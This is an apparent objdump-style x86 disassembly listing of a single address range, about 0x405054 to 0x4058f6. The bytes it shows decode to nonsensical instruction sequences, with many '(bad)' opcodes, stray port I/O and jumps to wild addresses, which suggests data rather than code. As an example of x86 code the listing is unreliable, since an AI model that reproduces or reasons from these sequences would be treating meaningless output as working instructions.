  405054:	fadd   QWORD PTR [edi]
  405056:	add    ecx,ebx
  405058:	out    dx,al
  405059:	(bad)  
  40505a:	(bad)  
  40505c:	repnz in al,dx
  40505e:	retf   0xcea9
  405061:	icebp  
  405062:	in     eax,dx
  405063:	mov    al,0xef
  405065:	in     eax,0xdd
  405067:	mov    edx,0xf6d1b8b0
  40506c:	idiv   ah
  40506e:	fcmovnu st,st(5)
  405070:	in     eax,0x1
  405072:	(bad)  
  405074:	aad    0xdd
  405076:	jmp    0x405057
  405078:	iret   
  405079:	mov    cl,0xa8
  40507b:	(bad)  
  40507c:	lods   eax,DWORD PTR ds:[esi]
  40507d:	fmul   st(4),st
  40507f:	shr    ecx,0xef
  405082:	mov    edx,0xfeede8bb
  405087:	mov    ecx,0xfffbdff6
  40508c:	idiv   ebx
  40508e:	fsubr  st(2),st
  405090:	pop    es
  405091:	aad    0xe1
  405093:	jmp    0xdee6:0xc9f80007
  40509a:	scas   eax,DWORD PTR es:[edi]
  40509b:	jmp    0x40506b
  40509d:	xlat   BYTE PTR ds:[ebx]
  40509e:	(bad)  
  40509f:	shl    dh,0xaf
  4050a2:	fcmovnbe st,st(5)
  4050a4:	enter  0xefb9,0xcc
  4050a8:	shl    esp,cl
  4050aa:	bnd ret 0xd6ce
  4050ae:	add    al,0xd0
  4050b0:	add    edx,ecx
  4050b2:	fsubrp st(2),st
  4050b4:	(bad)  
  4050b5:	in     al,0xc4
  4050b7:	int3   
  4050b8:	jmp    0x40507c
  4050ba:	fisubr WORD PTR [esi-0x39553637]
  4050c0:	test   al,0xe7
  4050c2:	aad    0xb5
  4050c4:	mov    edi,0xb0c9d9d6
  4050c9:	sti    
  4050ca:	(bad)  
  4050cb:	push   esi
  4050cd:	in     eax,0xc2
  4050cf:	rcr    ah,cl
  4050d1:	add    eax,DWORD PTR [ebx]
  4050d3:	(bad)  
  4050d4:	retf   
  4050d5:	les    eax,FWORD PTR [esp+eax*8]
  4050d8:	icebp  
  4050d9:	loopne 0x40509b
  4050db:	jmp    0xb4d2:0xc0f4c3d6
  4050e2:	out    0xe6,eax
  4050e4:	jmp    0xb91630a6
  4050e9:	mov    ebx,0x4febff7
  4050ee:	ffreep st(2)
  4050f0:	icebp  
  4050f1:	(bad)  
  4050f4:	por    mm5,mm4
  4050f7:	jecxz  0x4050f1
  4050f9:	out    dx,eax
  4050fa:	shr    DWORD PTR [ecx-0x1934321f],1
  405100:	stc    
  405101:	loopne 0x4050fd
  405103:	iret   
  405104:	mov    ebx,0xc3b9e9fa
  405109:	fcmovbe st,st(6)
  40510b:	rol    DWORD PTR [edi],cl
  40510d:	add    esp,ebp
  40510f:	test   ah,0xf0
  405112:	shl    eax,0xe7
  405115:	out    0xe9,eax
  405117:	adc    bl,ah
  405119:	ret    
  40511a:	repnz repz leave 
  40511d:	jmp    0x4050eb
  40511f:	repnz out 0xb9,al
  405122:	fxtract 
  405124:	enter  0xbbc9,0xdb
  405128:	cmc    
  405129:	shl    al,cl
  40512b:	push   es
  40512c:	(bad)  
  40512d:	in     al,0xf5
  40512f:	fadd   QWORD PTR [ecx]
  405131:	out    0xf0,al
  405133:	std    
  405134:	add    eax,DWORD PTR [esi]
  405136:	jecxz  0x405117
  405138:	call   0xb01e2e2c
  40513d:	lods   al,BYTE PTR ds:[esi]
  40513e:	shr    dl,cl
  405140:	mov    edx,0xcfeeaee1
  405145:	mov    ebx,0xfcee03d5
  40514a:	add    dh,ah
  40514c:	out    0x1,al
  40514e:	rcl    eax,cl
  405150:	retf   0xd5fe
  405153:	mov    ebp,0xf807d8df
  405158:	in     al,dx
  405159:	scas   eax,DWORD PTR es:[edi]
  40515a:	loope  0x40510c
  40515c:	lock mov ch,0xb6
  40515f:	jecxz  0x405126
  405161:	rcr    edi,cl
  405163:	mov    ebx,0xfaf7f9d4
  405168:	aad    0xfa
  40516a:	add    edi,edx
  40516c:	pop    es
  40516d:	mov    esp,0x6f2fcba
  405172:	add    cl,ch
  405174:	fmul   st,st(3)
  405176:	ret    0xec06
  405179:	mov    ebp,0xb3d5e6af
  40517e:	sti    
  40517f:	in     eax,dx
  405180:	sti    
  405181:	mov    bh,0xb1
  405183:	(bad)  
  405184:	stc    
  405185:	sar    BYTE PTR [esi-0x432a2a2d],1
  40518b:	pop    es
  40518c:	int    0xf2
  40518e:	fsubrp st(5),st
  405190:	or     bl,al
  405192:	std    
  405193:	fild   WORD PTR [eax]
  405195:	add    al,0xdd
  405197:	pop    es
  405198:	add    eax,0xeebfc8ef
  40519d:	ror    esp,cl
  40519f:	rol    bh,1
  4051a1:	aad    0xae
  4051a3:	mov    ah,0xee
  4051a6:	(bad)  
  4051a8:	icebp  
  4051a9:	stc    
  4051aa:	int    0xfd
  4051ac:	add    eax,0xc6fac4fd
  4051b1:	fneni(8087 only) 
  4051b3:	stc    
  4051b4:	retf   0xe3ec
  4051b7:	in     eax,0xc9
  4051b9:	(bad)  
  4051ba:	xlat   BYTE PTR ds:[ebx]
  4051bb:	out    0xac,eax
  4051bd:	iret   
  4051be:	ret    0xb3f3
  4051c1:	rcr    ecx,1
  4051c3:	lods   eax,DWORD PTR ds:[esi]
  4051c4:	fcmovbe st,st(5)
  4051c6:	aad    0xb1
  4051c8:	iret   
  4051c9:	fdivr  st,st(0)
  4051cb:	mov    ecx,0xddddd6e3
  4051d0:	icebp  
  4051d1:	sti    
  4051d2:	std    
  4051d3:	mul    cl
  4051d5:	in     al,0xe0
  4051d7:	cld    
  4051d8:	ror    bh,cl
  4051da:	loop   0x4051ad
  4051dc:	retf   
  4051dd:	rcl    dh,cl
  4051df:	shl    eax,cl
  4051e1:	in     eax,0xca
  4051e3:	into   
  4051e4:	into   
  4051e5:	shr    al,1
  4051e7:	mov    ecx,0xfbf0eefe
  4051ec:	loope  0x4051f3
  4051ee:	fcomi  st,st(0)
  4051f0:	neg    bh
  4051f2:	fcmovu st,st(7)
  4051f4:	jmp    0x4051c5
  4051f6:	ret    0xeadb
  4051f9:	scas   al,BYTE PTR es:[edi]
  4051fa:	mov    esi,0xb4e7ede1
  4051ff:	in     eax,dx
  405200:	cli    
  405201:	into   
  405202:	(bad)  
  405203:	clc    
  405204:	(bad)  
  405205:	shr    bl,1
  405207:	xlat   BYTE PTR ds:[ebx]
  405208:	add    ebp,esi
  40520a:	(bad)  
  40520c:	add    ecx,ebp
  40520e:	int3   
  40520f:	in     al,0x3
  405211:	shl    cl,1
  405213:	out    0xd6,al
  405215:	or     ecx,esp
  405217:	loopne 0x4051fa
  405219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40521a:	out    dx,eax
  40521b:	call   0xad1843f5
  405220:	shl    DWORD PTR [esi-0x1b31204e],1
  405226:	(bad)  
  405227:	fidiv  DWORD PTR [edi+edx*8-0x33180b3f]
  40522e:	loope  0x405237
  405230:	push   es
  405231:	ret    
  405232:	(bad)  
  405234:	fdivp  st(0),st
  405236:	jecxz  0x405244
  405238:	out    0xdf,al
  40523a:	retf   0xbcbf
  40523d:	shl    ebp,cl
  40523f:	hlt    
  405240:	test   al,0xfa
  405242:	repnz sti 
  405244:	mov    esi,0xeef5cbfd
  405249:	hlt    
  40524a:	mov    esp,0x101d9bc
  40524f:	rcr    esi,0x0
  405252:	sar    dl,0xe5
  405255:	into   
  405256:	(bad)  
  405257:	call   0xcd202c4a
  40525c:	test   al,0xed
  40525e:	(bad)  
  40525f:	(bad)  
  405260:	jmp    0xb4d8:0xb8d8b0cf
  405267:	fsubp  st(0),st
  405269:	cmc    
  40526a:	mov    edx,0xe106fbde
  40526f:	mov    ebp,0xf5d6c2f5
  405274:	leave  
  405275:	aam    0xdf
  405277:	clc    
  405278:	in     eax,0xd0
  40527a:	out    0xbe,al
  40527c:	lds    esi,FWORD PTR [esi-0x251e301d]
  405282:	leave  
  405283:	fcmove st,st(2)
  405285:	(bad)  
  405287:	int    0xba
  405289:	test   al,0xed
  40528c:	loopne 0x40526b
  40528e:	(bad)  
  405290:	or     esp,esp
  405292:	cld    
  405293:	or     ecx,DWORD PTR ds:0x612c4d4
  405299:	in     eax,dx
  40529a:	fnstsw WORD PTR [ebp-0x1a4c4239]
  4052a0:	(bad)  
  4052a2:	int3   
  4052a3:	mov    edx,0xbbd4e9b4
  4052a8:	cli    
  4052a9:	mov    edi,0xc5fcd0da
  4052ae:	test   DWORD PTR ds:0xe9d003e3,0xc4e3c4d4
  4052b8:	rcl    ecx,cl
  4052ba:	int3   
  4052bb:	jmp    0xecf82768
  4052c0:	shl    esp,1
  4052c2:	repnz jmp 0x3ee:0xf5bad6f1
  4052ca:	inc    DWORD PTR [esi]
  4052cc:	xlat   BYTE PTR ds:[ebx]
  4052cd:	loop   0x4052b6
  4052cf:	fadd   st(6),st
  4052d1:	leave  
  4052d2:	neg    al
  4052d4:	or     BYTE PTR [edx],al
  4052d6:	(bad)
  4052d9:	out    dx,al
  4052da:	in     eax,dx
  4052db:	out    dx,al
  4052dc:	call   0xe11440a8
  4052e1:	shr    BYTE PTR [esi-0xe131915],0xe3
  4052e8:	mov    ah,0xcc
  4052ea:	repz aad 0xe3
  4052ed:	mov    edi,0xdcd7d7f9
  4052f2:	std    
  4052f3:	add    al,ah
  4052f5:	in     eax,dx
  4052f6:	fdiv   st(6),st
  4052f8:	(bad)  
  4052fa:	stos   BYTE PTR es:[edi],al
  4052fb:	test   al,0xe2
  4052fd:	shl    BYTE PTR [ecx-0x24355714],cl
  405303:	mov    al,0xf2
  405305:	retf   0xcffb
  405308:	add    ecx,esp
  40530a:	cmc    
  40530b:	aad    0xd0
  40530d:	inc    cl
  40530f:	div    eax
  405311:	test   BYTE PTR [ecx],0xcb
  405314:	jmp    0xc0e7:0xcaecfa04
  40531b:	mul    DWORD PTR [edi+eiz*8-0x3f4f5217]
  405322:	loopne 0x405323
  405324:	jmp    0xdc2f3f25
  405329:	cld    
  40532a:	imul   bh
  40532c:	stc    
  40532d:	in     al,dx
  40532e:	icebp  
  40532f:	retf   
  405330:	jecxz  0x405314
  405332:	fisttp QWORD PTR [edx]
  405334:	aam    0xc8
  405336:	enter  0xc8dc,0xbe
  40533a:	lods   al,BYTE PTR ds:[esi]
  40533b:	mov    cl,0xb1
  40533d:	jecxz  0x4052ff
  40533f:	(bad)  
  405340:	sti    
  405341:	mov    dl,0xfa
  405343:	mov    ebx,0xb4b4e8d8
  405348:	mov    eax,0xecd9cec1
  40534d:	(bad)  
  40534e:	fdivrp st(2),st
  405350:	hlt    
  405351:	retf   
  405352:	enter  0xede1,0xf4
  405356:	add    ecx,esp
  405358:	fsubr  st,st(3)
  40535a:	fisubr WORD PTR [ecx-0x494f1943]
  405360:	shl    DWORD PTR [esi-0x5003646],0xf4
  405367:	mov    edi,0xd2eee1bf
  40536c:	(bad)  
  40536d:	mov    ebx,0xf8fad8f4
  405372:	add    eax,0x8e807cf
  405377:	out    dx,al
  405378:	fidivr DWORD PTR [eax-0x51305048]
  40537e:	loop   0x405365
  405380:	out    0xe7,eax
  405382:	mov    ch,0xb6
  405384:	(bad)  
  405386:	in     eax,dx
  405387:	fidivr WORD PTR [ebp-0xb0840fd]
  40538d:	fistp  QWORD PTR [edx+ecx*1-0xb180129]
  405394:	test   BYTE PTR [ebx],0xe8
  405397:	cld    
  405398:	(bad)  [eax-0x5331301f]
  40539e:	shl    BYTE PTR [ecx+eax*8-0x14153720],cl
  4053a5:	int    0xd4
  4053a7:	fsubp  st(6),st
  4053a9:	lock (bad) 
  4053ab:	shl    ebp,1
  4053ad:	int3   
  4053ae:	ret    0xf5fa
  4053b1:	retf   0xefde
  4053b4:	(bad)  
  4053b5:	fild   WORD PTR [edx]
  4053b7:	int    0xe6
  4053b9:	jecxz  0x405379
  4053bb:	int    0xe5
  4053bd:	jmp    0xe6153d9e
  4053c2:	out    dx,al
  4053c3:	aam    0xbe
  4053c5:	mov    edx,0xd9d6d7cf
  4053ca:	in     eax,dx
  4053cb:	neg    ah
  4053cd:	fld    QWORD PTR [ecx]
  4053cf:	in     eax,0xe9
  4053d1:	out    0x7,eax
  4053d3:	loopne 0x4053d5
  4053d5:	in     al,0xfc
  4053d7:	(bad)
  4053da:	icebp  
  4053db:	out    dx,eax
  4053dc:	(bad)  
  4053dd:	jmp    0xb8f5:0xefc6b1ce
  4053e4:	int3   
  4053e5:	in     eax,0xf8
  4053e7:	mov    esp,0xf6deceec
  4053ec:	fcmovb st,st(3)
  4053ee:	jmp    0x4053ac
  4053f0:	rol    al,0xf0
  4053f3:	or     dl,bh
  4053f5:	retf   0xbc4
  4053f8:	shr    edi,cl
  4053fa:	in     al,dx
  4053fb:	out    0xe2,eax
  4053fd:	mov    cl,0xe9
  4053ff:	rcr    ebx,0xcd
  405402:	aad    0xb5
  405404:	in     eax,0xf0
  405406:	sar    DWORD PTR [edx-0x1c1cfe4c],1
  40540c:	(bad)  
  40540e:	repz mov ecx,0xd8fbc4df
  405414:	fstp   st(2)
  405416:	loop   0x405420
  405418:	repz int3 
  40541a:	fsubp  st(0),st
  40541c:	icebp  
  40541d:	mov    al,0xcd
  40541f:	(bad)  
  405420:	leave  
  405421:	fmul   st,st(4)
  405423:	mov    ecx,0xd5fbefbe
  405428:	fcomip st,st(6)
  40542a:	rol    DWORD PTR [ecx],cl
  40542c:	cld    
  40542d:	ret    0xfad8
  405430:	stc    
  405431:	les    ecx,FWORD PTR [eax]
  405433:	iret   
  405434:	fadd   st(5),st
  405436:	stc    
  405437:	loop   0x4053f9
  405439:	jmp    0xd0b7:0xc3c0cebf
  405440:	ror    esp,0xce
  405443:	mov    eax,0xf2d8b3ef
  405448:	mov    ecx,0x6c7bff0
  40544d:	add    eax,0xae4c7f6
  405452:	enter  0xcfe8,0xce
  405456:	retf   
  405457:	or     BYTE PTR [eax+ebp*4],cl
  40545a:	fidiv  WORD PTR [eax-0x44362838]
  405460:	repz mov bh,0xee
  405463:	fcmovbe st,st(3)
  405465:	aad    0xee
  405467:	cmc    
  405468:	in     al,dx
  405469:	shl    bh,1
  40546b:	out    dx,eax
  40546c:	sar    bh,1
  40546e:	push   es
  40546f:	fdiv   st,st(1)
  405471:	add    al,0xe9
  405473:	(bad)  
  405474:	stc    
  405475:	retf   0xdbf3
  405478:	in     al,dx
  405479:	fild   QWORD PTR [edi-0x4294940]
  40547f:	shl    BYTE PTR [esi-0x2f154714],1
  405485:	fiadd  DWORD PTR [ebx]
  405487:	rcr    al,cl
  405489:	(bad)  
  40548b:	add    esp,edx
  40548d:	ret    
  40548e:	add    DWORD PTR [ebx],eax
  405490:	jmp    0x405468
  405492:	out    0xca,al
  405494:	loope  0x405473
  405496:	out    dx,al
  405497:	pop    es
  405498:	loope  0x405468
  40549a:	lods   al,BYTE PTR ds:[esi]
  40549b:	repnz out 0xf6,eax
  40549e:	out    0xd6,eax
  4054a0:	mov    dh,0xf7
  4054a2:	jmp    0x405496
  4054a4:	repnz fidiv DWORD PTR [edx-0x31002848]
  4054ab:	out    dx,al
  4054ac:	loop   0x4054a3
  4054ae:	clc    
  4054af:	(bad)  
  4054b0:	out    0xfc,eax
  4054b2:	psubusb mm4,mm1
  4054b5:	or     ecx,ebp
  4054b7:	in     eax,0xcd
  4054b9:	fsub   st(3),st
  4054bb:	call   0xe1f20c8b
  4054c0:	into   
  4054c1:	mov    bh,0xc0
  4054c3:	leave  
  4054c4:	shr    dh,1
  4054c6:	rcr    dh,cl
  4054c8:	(bad)  
  4054c9:	stc    
  4054ca:	shl    dl,cl
  4054cc:	(bad)  
  4054cd:	(bad)  
  4054ce:	stc    
  4054cf:	add    ecx,esi
  4054d1:	(bad)  
  4054d2:	jmp    0x4054df
  4054d4:	fcmovu st,st(2)
  4054d6:	int3   
  4054d7:	retf   0xa805
  4054da:	into   
  4054db:	ret    0xaebd
  4054de:	xlat   BYTE PTR ds:[ebx]
  4054df:	rcr    dl,1
  4054e1:	ror    esi,cl
  4054e3:	mov    al,0xc4
  4054e5:	call   0xb83c3fb9
  4054ea:	cld    
  4054eb:	cmc    
  4054ec:	lock push es
  4054ee:	(bad)  
  4054ef:	cli    
  4054f0:	hlt    
  4054f1:	mov    edi,0xea0ffc03
  4054f6:	jmp    0x4054e1
  4054f8:	fsub   QWORD PTR [edi-0x3f431832]
  4054fe:	cmc    
  4054ff:	lods   al,BYTE PTR ds:[esi]
  405500:	sar    bl,1
  405502:	jmp    0xf10953e5
  405507:	mov    esi,0xc0f1c8d0
  40550c:	repz in eax,0xda
  40550f:	jmp    0xe603:0xcf02d4dc
  405516:	or     al,0xde
  405518:	or     eax,0xcbd1eec7
  40551d:	out    dx,al
  40551e:	lods   eax,DWORD PTR ds:[esi]
  40551f:	out    0xd4,eax
  405521:	repz cmc 
  405523:	out    0xb4,eax
  405525:	enter  0xeced,0xf7
  405529:	add    edi,edx
  40552b:	mov    edi,0x6e5dedb
  405530:	or     esp,ebx
  405532:	(bad)  
  405533:	sti    
  405534:	add    BYTE PTR [edi],al
  405536:	aam    0x13
  405538:	jmp    FWORD PTR [eax+esi*4-0x291a172d]
  40553f:	jmp    0x405522
  405541:	out    dx,al
  405542:	int    0xd2
  405544:	(bad)  
  405545:	(bad)  
  405546:	(bad)  
  405548:	clc    
  405549:	(bad)  
  40554b:	shl    eax,1
  40554d:	mov    ebx,0x8c206de
  405552:	std    
  405553:	add    al,0xe9
  405555:	aam    0xce
  405557:	dec    BYTE PTR ds:0xcdc6b2f2
  40555d:	mov    bl,0xd0
  40555f:	icebp  
  405560:	aad    0xe9
  405562:	cmc    
  405563:	out    dx,eax
  405564:	fmulp  st(4),st
  405566:	mov    ch,0xff
  405568:	mov    edi,0xd8f601fa
  40556d:	add    edx,esp
  40556f:	loope  0x40556b
  405571:	sti    
  405572:	or     esi,edx
  405574:	cld    
  405575:	leave  
  405576:	stc    
  405577:	add    al,0xc8
  405579:	sar    BYTE PTR [ebp-0x4a54521e],1
  40557f:	loop   0x405545
  405581:	clc    
  405582:	out    dx,eax
  405583:	retf   0xbdfe
  405586:	fidivr DWORD PTR [ebp-0x41030e29]
  40558c:	into   
  40558d:	push   es
  40558e:	rol    dh,0xb
  405591:	shl    ch,0xe9
  405594:	cld    
  405595:	push   cs
  405596:	or     ebp,eax
  405598:	loope  0x405542
  40559a:	mov    bl,0xa8
  40559c:	retf   0xe3b1
  40559f:	mov    bl,0xb6
  4055a1:	int    0xbb
  4055a3:	(bad)  
  4055a4:	cmc    
  4055a5:	aad    0xbf
  4055a7:	icebp  
  4055a8:	ror    cl,1
  4055aa:	pop    es
  4055ab:	lock mov esi,0x2dabccd
  4055b1:	call   0xf0b40be
  4055b6:	ret    0xe605
  4055b9:	mov    esi,0xebacc4ad
  4055be:	lods   eax,DWORD PTR ds:[esi]
  4055bf:	out    0xf7,al
  4055c1:	retf   
  4055c2:	repnz repz (bad) 
  4055c5:	in     al,0xce
  4055c7:	hlt    
  4055c8:	int    0xf5
  4055ca:	out    0xb9,eax
  4055cc:	sar    DWORD PTR [esi-0xa3c0f1d],cl
  4055d2:	or     DWORD PTR [eax],eax
  4055d4:	cmc    
  4055d5:	fadd   QWORD PTR [ebx]
  4055d7:	std    
  4055d8:	cld    
  4055d9:	repz mov cl,0xd7
  4055dc:	mov    ebp,0xe1c9c2bd
  4055e1:	scas   eax,DWORD PTR es:[edi]
  4055e2:	mov    al,0xc7
  4055e4:	std    
  4055e5:	std    
  4055e6:	(bad)  
  4055e7:	mov    edx,0xc0c3d8ba
  4055ec:	xlat   BYTE PTR ds:[ebx]
  4055ed:	fadd   QWORD PTR [ebx]
  4055ef:	(bad)  
  4055f1:	or     al,ch
  4055f3:	jecxz  0x405602
  4055f5:	jmp    0xee5024f7
  4055fa:	stos   BYTE PTR es:[edi],al
  4055fb:	retf   
  4055fc:	mov    ebp,0xe4cab1af
  405601:	out    0xd8,al
  405603:	cli    
  405604:	neg    esp
  405606:	stc    
  405607:	xlat   BYTE PTR ds:[ebx]
  405608:	lock std 
  40560a:	mov    dh,0xd3
  40560c:	add    cl,al
  40560e:	(bad)  
  405610:	xlat   BYTE PTR ds:[ebx]
  405611:	or     ah,ch
  405613:	(bad)  
  405614:	clc    
  405615:	or     bh,dl
  405617:	clc    
  405618:	in     eax,0xec
  40561a:	mov    ebp,0xd0b6b2c2
  40561f:	aad    0xd9
  405621:	(bad)  
  405623:	mov    ch,0xfa
  405625:	mov    ah,0xf2
  405627:	(bad)  
  405628:	out    dx,al
  405629:	loope  0x4055f3
  40562b:	rcr    dl,0xf7
  40562e:	fld    st(2)
  405630:	cli    
  405631:	jmp    0xe24a322a
  405636:	out    0xe9,al
  405638:	add    eax,0xe2bebced
  40563d:	(bad)  
  40563e:	enter  0xeef0,0xb0
  405642:	out    0xca,eax
  405644:	jmp    0xd1dc:0xbff8d0fc
  40564b:	fadd   st,st(7)
  40564d:	aam    0xdd
  40564f:	aad    0xc0
  405651:	aad    0xc5
  405653:	inc    DWORD PTR [edx]
  405655:	in     eax,dx
  405656:	(bad)  
  405657:	sar    edi,cl
  405659:	mov    esp,0xafd0c6dd
  40565e:	mov    esp,0xf2cbc8f0
  405663:	in     eax,0xf3
  405665:	in     eax,dx
  405666:	mov    esi,0xe0e2ecea
  40566b:	iret   
  40566c:	mov    edi,0xf7dff3da
  405671:	loope  0x405671
  405673:	call   0xcb0b1a72
  405678:	icebp  
  405679:	retf   0xebc9
  40567c:	retf   0xe8eb
  40567f:	retf   0xbbc5
  405682:	out    dx,eax
  405683:	clc    
  405684:	(bad)  
  405686:	(bad)  
  405688:	fsubp  st(7),st
  40568a:	(bad)  
  40568b:	(bad)  
  40568d:	(bad)  
  40568f:	mov    ebp,0xfa0bfed4
  405694:	sti    
  405695:	leave  
  405696:	paddsw mm6,mm1
  405699:	lds    edi,FWORD PTR [ebp-0x32502e53]
  40569f:	(bad)  
  4056a0:	test   ecx,0xbafad9e8
  4056a6:	shl    edi,1
  4056a8:	loop   0x405692
  4056aa:	out    dx,eax
  4056ab:	(bad)  
  4056ac:	loopne 0x40567a
  4056ae:	fcmovnbe st,st(5)
  4056b0:	mov    ebx,0xbc8c4f9
  4056b6:	add    esi,edx
  4056b8:	ror    al,cl
  4056ba:	out    dx,al
  4056bb:	ret    
  4056bc:	loop   0x405689
  4056be:	xlat   BYTE PTR ds:[ebx]
  4056bf:	imul   ch
  4056c1:	test   dl,0xc5
  4056c4:	cli    
  4056c5:	fmul   st(1),st
  4056c7:	iret   
  4056c8:	sar    ch,cl
  4056ca:	xlat   BYTE PTR ds:[ebx]
  4056cb:	out    0xb4,eax
  4056cd:	lock or ebx,esi
  4056d0:	jmp    0xec0162cb
  4056d5:	cld    
  4056d6:	(bad)  
  4056d7:	jmp    0x4056bf
  4056d9:	bnd jmp 0xe9133ba5
  4056df:	jmp    0xd7ef:0xcfc4e6c1
  4056e6:	fsub   st(2),st
  4056e8:	std    
  4056e9:	(bad)  
  4056ea:	loopne 0x4056dd
  4056ec:	clc    
  4056ed:	loop   0x4056a9
  4056ef:	repnz sar ecx,0xcb
  4056f3:	add    eax,0xd304ecc0
  4056f8:	out    0xdf,al
  4056fa:	mov    eax,0xd2cfa8e5
  4056ff:	sti    
  405700:	retf   0xe4bb
  405703:	sti    
  405704:	cli    
  405705:	mov    ebx,0xf5fab5ca
  40570a:	in     eax,dx
  40570b:	ffree  st(2)
  40570d:	mov    edi,0xe6fcf1f5
  405712:	add    dh,bh
  405714:	(bad)  
  405715:	in     al,dx
  405716:	add    eax,0xc0ae020c
  40571b:	jmp    0xe80a3be7
  405720:	(bad)  
  405721:	icebp  
  405722:	mov    eax,0xddffcaf1
  405727:	jmp    0xdfd6:0xd9effcb4
  40572e:	push   es
  40572f:	les    edi,FWORD PTR [eax+0xbe0e20a]
  405735:	ret    
  405736:	add    ecx,esi
  405738:	repnz mov esi,0xccd7b2e7
  40573e:	int3   
  40573f:	lds    edi,FWORD PTR [edx-0x10244837]
  405745:	xlat   BYTE PTR ds:[ebx]
  405746:	repnz aam 0xef
  405749:	repnz mov ecx,0xd2e2cde7
  40574f:	sti    
  405750:	mov    eax,0x107f4d0
  405755:	fcmovnu st,st(3)
  405757:	or     edi,esp
  405759:	(bad)  
  40575b:	rol    cl,cl
  40575d:	in     eax,0xf5
  40575f:	int3   
  405760:	mov    al,0xd0
  405762:	repnz fdecstp 
  405765:	int3   
  405766:	in     eax,dx
  405767:	mov    ah,0xd0
  405769:	mov    ebp,0xd4f2faba
  40576e:	add    bh,BYTE PTR [ecx-0x2b100224]
  405774:	pminub mm0,mm5
  405777:	psrad  mm5,QWORD PTR [eax-0x11383a58]
  40577e:	(bad)  
  40577f:	iret   
  405780:	out    dx,al
  405781:	loope  0x40575a
  405783:	jmp    0x40574f
  405785:	mov    ebp,0xdababfce
  40578a:	iret   
  40578b:	mov    ebp,0xd7c6ecf5
  405790:	or     bl,bl
  405792:	cli    
  405793:	cmc    
  405794:	call   0xe7265e66
  405799:	scas   al,BYTE PTR es:[edi]
  40579a:	int    0xe5
  40579c:	cmc    
  40579d:	enter  0xf4cb,0xd6
  4057a1:	mov    ecx,0xf7b8c5cd
  4057a6:	out    dx,eax
  4057a7:	repz mov esp,0x7dcb9f7
  4057ad:	loop   0x405780
  4057af:	hlt    
  4057b0:	jmp    0xedee:0xe803d5d8
  4057b7:	call   0xbd0e1fc2
  4057bc:	jmp    0x4057ac
  4057be:	call   0xd9210db3
  4057c3:	leave  
  4057c4:	cmc    
  4057c5:	enter  0xddb4,0xef
  4057c9:	cld    
  4057ca:	xlat   BYTE PTR ds:[ebx]
  4057cb:	int    0xff
  4057cd:	fld    DWORD PTR [ecx]
  4057cf:	ret    
  4057d0:	repnz or bl,ah
  4057d3:	out    dx,al
  4057d4:	add    al,0xc
  4057d6:	hlt    
  4057d7:	out    0xfa,al
  4057d9:	rcl    edx,cl
  4057db:	shr    DWORD PTR [esi-0x1a0c5138],cl
  4057e1:	ror    ch,cl
  4057e3:	jmp    0xc1c2:0x3eedfde
  4057ea:	add    dl,dl
  4057ec:	into   
  4057ed:	int    0xc1
  4057ef:	loope  0x4057da
  4057f1:	loopne 0x4057ba
  4057f3:	not    dh
  4057f5:	loopne 0x405802
  4057f7:	or     BYTE PTR [ebx],cl
  4057f9:	ret    0xcec6
  4057fc:	mov    bl,0xd2
  4057fe:	into   
  4057ff:	cli    
  405800:	jmp    0xbdb3:0xd4edc4af
  405807:	mov    eax,0xe6e0e2ea
  40580c:	(bad)  
  40580e:	inc    DWORD PTR [eax]
  405810:	inc    BYTE PTR [esi]
  405812:	add    edx,ebx
  405814:	out    dx,al
  405815:	jmp    0xe6205fe8
  40581a:	ffree  st(7)
  40581c:	out    dx,eax
  40581d:	mov    bl,0xb6
  40581f:	lods   al,BYTE PTR ds:[esi]
  405820:	fnstenv [eax-0x450f4f08]
  405826:	std    
  405827:	(bad)  
  405828:	fnstenv [edi-0x904042d]
  40582e:	add    ebp,esp
  405830:	jmp    0x4057f2
  405832:	enter  0xf9fa,0xf4
  405836:	cli    
  405837:	adc    eax,DWORD PTR ds:0xc3cce9e4
  40583d:	int3   
  40583e:	repz cli 
  405840:	test   al,0xc9
  405842:	mov    ah,0xee
  405844:	fstp   TBYTE PTR [edi-0x4816fd47]
  40584a:	(bad)  
  40584b:	out    0x5,al
  40584d:	out    0xc4,eax
  40584f:	jecxz  0x405842
  405851:	neg    esi
  405853:	shl    ebp,0xe2
  405856:	loop   0x405850
  405858:	repz fcomip st,st(0)
  40585b:	(bad)  
  40585c:	into   
  40585d:	icebp  
  40585e:	(bad)
  405861:	mov    ecx,0xfff9d3b7
  405866:	shl    al,1
  405868:	aad    0xb7
  40586a:	cld    
  40586b:	int    0xf0
  40586d:	add    edi,DWORD PTR [eax+eiz*8-0x23fc0835]
  405874:	call   ebp
  405876:	fild   WORD PTR [eax]
  405878:	rol    eax,cl
  40587a:	int3   
  40587b:	(bad)
  40587e:	shr    BYTE PTR [ecx-0x484e2a0b],1
  405884:	rcl    edi,1
  405886:	mov    dl,0xff
  405888:	fdiv   st(5),st
  40588a:	fsin   
  40588c:	(bad)  
  40588d:	rol    BYTE PTR [ecx],0xfe
  405890:	add    cl,BYTE PTR [ecx]
  405892:	sti    
  405893:	clc    
  405894:	add    al,0x1
  405896:	out    dx,al
  405897:	stc    
  405898:	in     eax,dx
  405899:	leave  
  40589a:	fsubp  st(2),st
  40589c:	lods   al,BYTE PTR ds:[esi]
  40589d:	int    0xe8
  40589f:	loope  0x40586c
  4058a1:	in     eax,dx
  4058a2:	mov    dl,0xb0
  4058a4:	jmp    0x40587e
  4058a6:	jecxz  0x405895
  4058a8:	clc    
  4058a9:	cli    
  4058aa:	ffreep st(3)
  4058ac:	rol    DWORD PTR [edx],1
  4058ae:	ret    
  4058af:	sti    
  4058b0:	sar    dh,cl
  4058b2:	aad    0xcb
  4058b4:	add    edi,ebp
  4058b6:	loopne 0x4058ca
  4058b8:	int3   
  4058b9:	loopne 0x40589d
  4058bb:	iret   
  4058bc:	jmp    0xeedb:0xe1e7e9e3
  4058c3:	repz mov ebx,0xdfb1f0ff
  4058c9:	add    eax,DWORD PTR [edx]
  4058cb:	(bad)  
  4058cd:	mul    edi
  4058cf:	icebp  
  4058d0:	(bad)  
  4058d1:	ffreep st(5)
  4058d3:	jecxz  0x40589b
  4058d5:	or     al,0xf9
  4058d7:	push   es
  4058d8:	out    0xe7,al
  4058da:	xlat   BYTE PTR ds:[ebx]
  4058db:	shl    DWORD PTR [edi-0x1f0b2b44],1
  4058e1:	jmp    0xd0f9:0xbbdeebf0
  4058e8:	retf   0xbde0
  4058eb:	pop    es
  4058ec:	call   ebx
  4058ee:	add    al,0xdc
  4058f0:	loop   0x4058f3
  4058f2:	in     al,0x8
  4058f4:	or     ecx,ebp
  4058f6:	ret    0xf3ca
